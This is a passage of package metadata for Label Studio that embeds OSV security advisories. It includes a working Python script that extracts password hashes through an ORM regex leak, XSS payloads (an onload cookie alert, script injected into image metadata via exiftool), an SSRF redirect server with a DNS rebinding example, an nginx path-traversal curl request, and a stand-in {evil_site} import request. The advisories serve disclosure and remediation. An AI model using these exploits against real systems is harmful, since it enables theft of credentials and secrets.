\"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.9.1.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.9.1.post0/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (>=19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","click (~=7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (>=1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (>=2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (>=4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (==0.0.23rc3)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)","redis (>=3.5)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)"],"requires_python":">=3.5, <3.9","summary":"Label Studio annotation tool","version":"0.9.1.post0","yanked":true,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"df65c0ecdf4b4f5acfbcada370da3fb554bdc469d34c50358fa8584f8cb42f0c","md5":"2095112ef44d4c67ea4bb78e3d8d55cb","sha256":"5c192f1b06b3ee07b33d2bdeedbd2a237e8cb9ab71331df55d0d1fab955fd1b3"},"downloads":-1,"filename":"label_studio-0.9.1.post0-py3-none-any.whl","has_sig":false,"md5_digest":"2095112ef44d4c67ea4bb78e3d8d55cb","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5, <3.9","size":13495668,"upload_time":"2021-02-17T14:28:33","upload_time_iso_8601":"2021-02-17T14:28:33.853666Z","url":"https://files.pythonhosted.org/packages/df/65/c0ecdf4b4f5acfbcada370da3fb554bdc469d34c50358fa8584f8cb42f0c/label_studio-0.9.1.post0-py3-none-any.whl","yanked":true,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"bc3f59d03d195e69dbe7380ff3ed9830acaca432d72f14c0f1610d27b153d3c4","md5":"a49f68d0dbed07c463fc910916ae855f","sha256":"ca76ccc5ed1003bff19f27b3f9401f794167984212206a8ce591c02ae919430e"},"downloads":-1,"filename":"label-studio-0.9.1.post0.tar.gz","has_sig":false,"md5_digest":"a49f68d0dbed07c463fc910916ae855f","packagetype":"sdist","python_version":"source","requires_python":">=3.5, <3.9","size":13394206,"upload_time":"2021-02-17T14:30:22","upload_time_iso_8601":"2021-02-17T14:30:22.130452Z","url":"https://files.pythonhosted.org/packages/bc/3f/59d03d195e69dbe7380ff3ed9830acaca432d72f14c0f1610d27b153d3c4/label-studio-0.9.1.post0.tar.gz","yanked":true,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak 